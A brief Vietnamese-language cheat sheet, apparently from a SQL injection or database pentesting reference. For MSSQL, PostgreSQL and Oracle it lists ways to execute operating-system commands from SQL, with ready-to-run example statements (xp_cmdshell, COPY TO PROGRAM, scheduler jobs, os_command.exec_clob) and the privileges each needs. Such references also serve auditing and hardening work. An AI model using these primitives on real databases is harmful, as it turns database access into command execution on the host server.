# OS Command

| DBMS | Hàm / Primitive | Cách dùng | Quyền / điều kiện |
|---|---|---|---|
| MSSQL | `xp_cmdshell` | `EXEC xp_cmdshell 'whoami';` | Phải được bật; thường cần quyền cao |
| PostgreSQL | `COPY ... PROGRAM` | `COPY (SELECT '') TO PROGRAM 'id';` | Cần superuser hoặc role `pg_execute_server_program` |
| Oracle | `DBMS_SCHEDULER.CREATE_JOB` | `BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'exec', job_type => 'EXECUTABLE', job_action => '/bin/id', enabled => TRUE); END;` | Cần quyền scheduler / executable job |
| Oracle | `os_command.exec_clob()` | `SELECT os_command.exec_clob('id') FROM dual;` | Package phải tồn tại và có quyền `EXECUTE` |

